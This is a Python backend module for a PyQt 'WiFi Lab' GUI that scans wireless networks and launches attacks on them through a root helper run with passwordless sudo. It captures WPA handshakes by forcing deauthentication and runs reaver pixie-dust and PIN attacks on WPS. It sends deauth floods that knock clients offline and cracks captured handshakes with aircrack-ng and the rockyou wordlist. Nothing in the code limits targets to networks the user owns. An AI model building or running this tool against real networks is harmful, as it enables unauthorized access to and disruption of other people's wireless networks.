"""wifi_backend.py — scan/attack logic for WiFi Lab GUI.

Runs the wifi-lab-priv helper as root via sudo. All heavy work happens on
worker threads and results are delivered through Qt signals so the UI never
blocks. Active helper processes are tracked so the user can cancel them.
"""
import json
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from dataclasses import dataclass

from PyQt6.QtCore import QObject, pyqtSignal

HELPER = "wifi-lab-priv"
DATA_DIR = os.path.expanduser("~/.local/share/wifi-lab")
CAPTURE_DIR = os.path.join(DATA_DIR, "captures")
CONFIG_PATH = os.path.join(DATA_DIR, "config.json")

DEFAULT_CONFIG = {
    "interface": "wlan0",
    "target_ssid": "",
    "target_bssid": "",
    "wordlist": "/usr/share/wordlists/rockyou.txt",
    "capture_timeout": 120,
    "reaver_timeout": 600,
}

TOOL_PACKAGES = {
    "nmcli": "network-manager",
    "iw": "iw",
    "aircrack-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "reaver": "reaver",
}

_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def split_nmcli_terse(line):
    """Split a `nmcli -t` line on unescaped colons.

    nmcli escapes a literal ':' inside a value as '\\:' and a literal '\\' as
    '\\\\'. Splitting on every ':' (as str.split does) corrupts fields such as
    BSSID (AA:BB:CC:DD:EE:FF), shifting CHAN/FREQ/SIGNAL into the wrong slots.
    """
    fields, cur, i = [], [], 0
    while i < len(line):
        ch = line[i]
        if ch == "\\" and i + 1 < len(line):
            cur.append(line[i + 1])
            i += 2
            continue
        if ch == ":":
            fields.append("".join(cur))
            cur = []
            i += 1
            continue
        cur.append(ch)
        i += 1
    fields.append("".join(cur))
    return fields


_HELPER_CACHE = {"path": None, "checked": False}


def resolve_helper(force=False):
    """Return the first wifi-lab-priv path that sudo lets us run without a
    password, or None. Probed once and cached (use force=True to re-probe).

    Two installers may have placed a helper: /usr/local/bin (install.sh, GUI)
    and /usr/local/sbin (setup_privileges.sh, Flask). Only the path listed in
    sudoers will answer `sudo -n <path> check` successfully.
    """
    if _HELPER_CACHE["checked"] and not force:
        return _HELPER_CACHE["path"]

    candidates = []
    for path in ("/usr/local/bin/wifi-lab-priv", "/usr/local/sbin/wifi-lab-priv"):
        if os.path.isfile(path) and os.access(path, os.X_OK):
            candidates.append(path)
    found = shutil.which(HELPER)
    if found and found not in candidates:
        candidates.append(found)

    chosen = None
    for path in candidates:
        try:
            r = subprocess.run(
                ["sudo", "-n", path, "check"],
                capture_output=True, text=True, timeout=10,
            )
            if r.returncode == 0 and "ok" in (r.stdout or "").lower():
                chosen = path
                break
        except Exception:
            continue

    _HELPER_CACHE.update(path=chosen, checked=True)
    return chosen


def list_interfaces():
    """Return sorted names of wireless interfaces (no root required).

    Primary source is /sys/class/net/<if>/wireless, which is reliable and
    instant. Falls back to `iw dev` and `nmcli` if sysfs yields nothing.
    """
    names = set()
    netdir = "/sys/class/net"
    try:
        for entry in os.listdir(netdir):
            if os.path.exists(os.path.join(netdir, entry, "wireless")):
                names.add(entry)
    except OSError:
        pass

    if not names:
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True,
                               text=True, timeout=10)
            for line in r.stdout.splitlines():
                text = line.strip()
                if text.startswith("Interface "):
                    names.add(text.split(None, 1)[1])
        except Exception:
            pass

    if not names:
        try:
            r = subprocess.run(
                ["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"],
                capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                parts = split_nmcli_terse(line)
                if len(parts) >= 2 and parts[1] == "wifi":
                    names.add(parts[0])
        except Exception:
            pass

    return sorted(names)


@dataclass
class Network:
    ssid: str
    bssid: str
    channel: str = ""
    frequency: str = ""
    signal: int = 0
    security: str = ""
    wps: bool = False
    wps_locked: bool | None = None
    mode: str = ""
    active: bool = False
    in_use: bool = False
    is_target: bool = False

    def display_name(self):
        return self.ssid or "(hidden)"


def parse_ap_list(iw_dump):
    """Parse `iw scan` dump into a list of AP dicts."""
    aps = []
    parts = re.split(r"(?m)^BSS ([0-9A-Fa-f:]{17})", iw_dump or "")
    # parts = ['', mac, body, mac, body, ...]
    for i in range(1, len(parts), 2):
        mac = parts[i].strip().lower()
        body = parts[i + 1] if i + 1 < len(parts) else ""
        ap = {"bssid": mac, "ssid": "", "channel": None, "freq": None,
              "wps": False, "wps_locked": None, "wpa1": False, "wpa2": False,
              "wpa3": False, "signal": None, "mode": "Unknown"}
        for line in body.splitlines():
            line = line.strip()
            if line.startswith("SSID:"):
                ap["ssid"] = line.split(":", 1)[1].strip()
            elif "DS Parameter set: channel" in line:
                try:
                    ap["channel"] = int(line.rsplit(" ", 1)[1])
                except (ValueError, IndexError):
                    pass
            elif line.startswith("freq:"):
                try:
                    ap["freq"] = int(line.split(":", 1)[1].strip())
                except ValueError:
                    pass
            elif line.startswith("signal:"):
                try:
                    ap["signal"] = int(float(line.split(":", 1)[1].split()[0]))
                except (ValueError, IndexError):
                    pass
            elif "WPS:" in line:
                ap["wps"] = True
            elif "AP Setup Locked:" in line:
                value = line.split(":", 1)[1].strip()
                try:
                    ap["wps_locked"] = bool(int(value, 0))
                except ValueError:
                    ap["wps_locked"] = value.lower() not in ("0", "0x0", "no")
            elif "Wi-Fi Protected Setup State:" in line:
                # Presence of this attribute also means WPS is advertised.
                ap["wps"] = True
            elif re.match(r"^\s*WPA:$", line):
                ap["wpa1"] = True
            elif re.match(r"^\s*RSN:$", line):
                ap["wpa2"] = True
            elif "WPA3" in line:
                ap["wpa3"] = True
            elif "IBSS" in line:
                ap["mode"] = "Ad-hoc"
            elif "ESS" in line:
                ap["mode"] = "Infrastructure"
        if ap["wps"] and ap["wps_locked"] is None:
            ap["wps_locked"] = False
        aps.append(ap)
    return aps


class WifiBackend(QObject):
    scanFinished = pyqtSignal(list)
    scanFailed = pyqtSignal(str)
    progress = pyqtSignal(str)
    attackFinished = pyqtSignal(bool, str)
    toolStateChanged = pyqtSignal(dict)
    installFinished = pyqtSignal(bool, str)

    def __init__(self, parent=None):
        super().__init__(parent)
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        self.config = self.load_config()
        self.iface = self.config.get("interface", "wlan0")
        self._proc = None
        self._lock = threading.Lock()

    # --------------------------- safe signals ---------------------------
    def _safe_emit(self, signal, *args):
        """Emit a signal, ignoring errors if the C++ object was deleted
        (e.g. the window was closed while a worker thread was running)."""
        try:
            signal.emit(*args)
        except RuntimeError:
            pass

    def _emit_progress(self, line):
        self._safe_emit(self.progress, line)

    def _emit_tool_state(self, state):
        self._safe_emit(self.toolStateChanged, state)

    def _emit_install_finished(self, ok, msg):
        self._safe_emit(self.installFinished, ok, msg)

    def _emit_scan(self, nets):
        self._safe_emit(self.scanFinished, nets)

    def _emit_scan_failed(self, msg):
        self._safe_emit(self.scanFailed, msg)

    def _emit_attack(self, ok, msg):
        self._safe_emit(self.attackFinished, ok, msg)

    # ------------------------------ config ------------------------------
    def load_config(self):
        try:
            with open(CONFIG_PATH, encoding="utf-8") as f:
                cfg = json.load(f)
            merged = dict(DEFAULT_CONFIG)
            merged.update(cfg)
            return merged
        except Exception:
            return dict(DEFAULT_CONFIG)

    def save_config(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(self.config, f, indent=2)

    def set_interface(self, iface):
        self.iface = iface
        self.config["interface"] = iface
        self.save_config()

    def set_target(self, ssid=None, bssid=None):
        if ssid is not None:
            self.config["target_ssid"] = ssid
        if bssid is not None:
            self.config["target_bssid"] = bssid
        self.save_config()

    # --------------------------- process control ------------------------
    def _kill_proc(self, proc, timeout=5):
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
        try:
            proc.wait(timeout=timeout)
        except Exception:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    def _run_helper(self, args, on_line=None, timeout=None):
        """Run helper as root; stream lines to on_line. Returns (rc, lines).

        `timeout` (seconds) kills the process tree if it runs too long.
        """
        helper = resolve_helper()
        if not helper:
            # Re-probe: the user may have just run install.sh (sudoers changed).
            helper = resolve_helper(force=True)
        if not helper:
            raise RuntimeError(
                "Helper root belum diotorisasi. Jalankan: sudo ./install.sh "
                "(mengonfigurasi sudo NOPASSWD untuk wifi-lab-priv)."
            )
        cmd = ["sudo", "-n", helper] + args
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, start_new_session=True,
        )
        with self._lock:
            self._proc = proc
        timed_out = {"hit": False}
        timer = None
        if timeout:
            def _on_timeout():
                timed_out["hit"] = True
                self._kill_proc(proc)
            timer = threading.Timer(timeout, _on_timeout)
            timer.daemon = True
            timer.start()
        lines = []
        try:
            for line in proc.stdout:
                line = line.rstrip("\n")
                if line:
                    lines.append(line)
                if on_line:
                    on_line(line)
            proc.wait()
            rc = 124 if timed_out["hit"] else proc.returncode
            return rc, lines
        finally:
            if timer is not None:
                timer.cancel()
            with self._lock:
                if self._proc is proc:
                    self._proc = None

    def stop(self):
        """Kill the active helper process tree."""
        with self._lock:
            proc = self._proc
            self._proc = None
        if proc is None:
            return
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass

    # ----------------------------- tool checks --------------------------
    def check_tools(self):
        def worker():
            state = {}
            for tool in TOOL_PACKAGES:
                state[tool] = shutil.which(tool) is not None
            helper = resolve_helper(force=True)
            state["helper"] = helper is not None
            state["sudo"] = helper is not None
            state["helper_path"] = helper or ""
            self._emit_tool_state(state)
        threading.Thread(target=worker, daemon=True).start()

    def install(self, tool):
        pkg = TOOL_PACKAGES.get(tool)
        if not pkg:
            self._emit_install_finished(False, f"No package for {tool}")
            return

        def worker():
            try:
                rc, lines = self._run_helper(
                    ["install", pkg], on_line=self._emit_progress
                )
                ok = rc == 0
                msg = lines[-1] if lines else ("installed" if ok else "failed")
                self._emit_install_finished(ok, str(msg))
            except Exception as exc:
                self._emit_install_finished(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()

    # ------------------------------ scanning ----------------------------
    def scan(self):
        def worker():
            try:
                nets = self._nmcli_scan()
                self._enrich(nets)
                self._emit_scan(nets)
            except Exception as exc:
                self._emit_scan_failed(str(exc))
        threading.Thread(target=worker, daemon=True).start()

    def _nmcli_scan(self):
        subprocess.run(
            ["nmcli", "device", "wifi", "rescan", "ifname", self.iface],
            timeout=15, capture_output=True,
        )
        time.sleep(3)
        r = subprocess.run(
            ["nmcli", "-t", "-f",
             "SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY,ACTIVE,IN-USE,MODE",
             "device", "wifi", "list", "ifname", self.iface],
            capture_output=True, text=True, timeout=15,
        )
        nets = []
        for line in r.stdout.splitlines():
            parts = split_nmcli_terse(line)
            if len(parts) < 9:
                continue
            ssid, bssid, chan, freq, sig, sec, active, inuse, mode = parts[:9]
            bssid = bssid.strip().lower()
            if not bssid or bssid == "--" or not _MAC_RE.match(bssid):
                continue
            chan = chan.strip()
            if not chan.isdigit():
                continue
            nets.append(Network(
                ssid=ssid,
                bssid=bssid,
                channel=chan,
                frequency=freq,
                signal=int(sig) if sig.isdigit() else 0,
                security=self._norm_security(sec),
                mode=mode.strip(),
                active=(active.strip() == "yes"),
                in_use=(inuse.strip() == "*"),
                is_target=(
                    ssid == self.config.get("target_ssid")
                    or bssid == (self.config.get("target_bssid") or "").lower()
                ),
            ))
        return nets

    @staticmethod
    def _norm_security(sec):
        s = (sec or "").strip().upper()
        if s in ("", "--", "-", "NONE", "OPEN"):
            return "Open"
        if "WPA3" in s:
            return "WPA3"
        if "WPA2" in s and "WPA1" in s:
            return "WPA1/WPA2"
        if "WPA2" in s:
            return "WPA2"
        if "WPA1" in s:
            return "WPA1"
        if "WEP" in s:
            return "WEP"
        if "OPEN" in s:
            return "Open"
        return s or "Unknown"

    def _enrich(self, networks):
        """Merge iw scan data (WPS, channel, exact security) into networks."""
        try:
            rc, lines = self._run_helper(["scan", self.iface], timeout=60)
        except Exception as exc:
            self._emit_progress(f"[wps] info WPS tidak tersedia: {exc}")
            return
        if rc != 0:
            detail = next((l for l in reversed(lines) if l.strip()), "")
            self._emit_progress(
                "[wps] scan iw gagal (status WPS tidak terisi). "
                f"{detail} — pastikan helper diotorisasi: sudo ./install.sh"
            )
            return
        aps = parse_ap_list("\n".join(lines))
        if not aps:
            self._emit_progress(
                "[wps] scan iw tidak mengembalikan BSS; status WPS dilewati.")
            return
        by_mac = {ap["bssid"]: ap for ap in aps}
        for net in networks:
            ap = by_mac.get(net.bssid)
            if not ap:
                continue
            if ap.get("channel"):
                net.channel = str(ap["channel"])
            if ap.get("freq"):
                net.frequency = str(ap["freq"])
            if ap.get("signal") is not None:
                net.signal = ap["signal"]
            net.wps = bool(ap["wps"])
            net.wps_locked = ap["wps_locked"]
            if ap["wpa3"]:
                net.security = "WPA3"
            elif ap["wpa2"] and ap["wpa1"]:
                net.security = "WPA1/WPA2"
            elif ap["wpa2"]:
                net.security = "WPA2"
            elif ap["wpa1"]:
                net.security = "WPA1"
            if ap.get("mode"):
                net.mode = ap["mode"]

    # ------------------------------ attacks -----------------------------
    def attack_handshake(self, net):
        """Capture a WPA handshake from net (airodump + aireplay deauth)."""
        outprefix = os.path.join(CAPTURE_DIR, f"hs_{net.bssid.replace(':', '')}")
        timeout = int(self.config.get("capture_timeout", 120))

        def worker():
            try:
                rc, lines = self._run_helper(
                    ["handshake", self.iface, net.channel or "0",
                     net.bssid, outprefix, str(timeout)],
                    on_line=self._emit_progress,
                )
                if rc == 0 and any("HANDSHAKE_FOUND" in l for l in lines):
                    self._emit_attack(True, "Handshake captured: " + outprefix + ".pcap")
                else:
                    self._emit_attack(False,
                        "No handshake captured (timeout or target not responding).")
            except Exception as exc:
                self._emit_attack(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()

    def attack_wps(self, net, pin=None):
        """Run reaver against net. pin=None => pixie dust (-K 1)."""
        args = ["-i", self.iface, "-b", net.bssid, "-vv"]
        if net.channel:
            args += ["-c", net.channel]
        if pin:
            args += ["-p", pin]
        else:
            args += ["-K", "1"]
        timeout = int(self.config.get("reaver_timeout", 600))

        def worker():
            try:
                rc, lines = self._run_helper(
                    ["monitor-run", self.iface, net.channel or "-", "reaver"] + args,
                    on_line=self._emit_progress,
                )
                joined = "\n".join(lines)
                if "WPS PIN:" in joined or "KEY FOUND" in joined:
                    self._emit_attack(True, "WPS PIN recovered (see log).")
                elif rc == 0:
                    self._emit_attack(True, "Reaver finished (see log).")
                else:
                    self._emit_attack(False, "Reaver did not recover the PIN (see log).")
            except Exception as exc:
                self._emit_attack(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()

    def attack_deauth(self, net, count=20, client=None):
        """Send count deauth frames to net (optionally to one client)."""
        args = ["--deauth", str(count), "-D", "-a", net.bssid]
        if client:
            args += ["-c", client]
        args.append(self.iface)

        def worker():
            try:
                rc, lines = self._run_helper(
                    ["monitor-run", self.iface, net.channel or "-", "aireplay-ng"] + args,
                    on_line=self._emit_progress,
                )
                self._emit_attack(True, f"Deauth sent ({rc}); clients should drop.")
            except Exception as exc:
                self._emit_attack(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()

    def crack_capture(self, capfile, wordlist=None):
        """Run aircrack-ng on capfile with wordlist; report passphrase."""
        wordlist = wordlist or self.config.get("wordlist", "")
        if not os.path.isfile(wordlist):
            self._emit_attack(False,
                f"Wordlist not found: {wordlist}\nSet the path in Settings.")
            return
        if not os.path.isfile(capfile):
            self._emit_attack(False, f"Capture not found: {capfile}")
            return

        def worker():
            try:
                rc, lines = self._run_helper(
                    ["run", "aircrack-ng", "-w", wordlist, capfile],
                    on_line=self._emit_progress,
                )
                joined = "\n".join(lines)
                m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", joined)
                if m:
                    self._emit_attack(True,
                        f"Passphrase found: {m.group(1)}")
                else:
                    self._emit_attack(False,
                        "No passphrase found in wordlist (see log).")
            except Exception as exc:
                self._emit_attack(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()

    def restore(self):
        def worker():
            try:
                rc, lines = self._run_helper(["restore", self.iface])
                self._emit_attack(rc == 0, "Interface restored to managed mode.")
            except Exception as exc:
                self._emit_attack(False, str(exc))
        threading.Thread(target=worker, daemon=True).start()
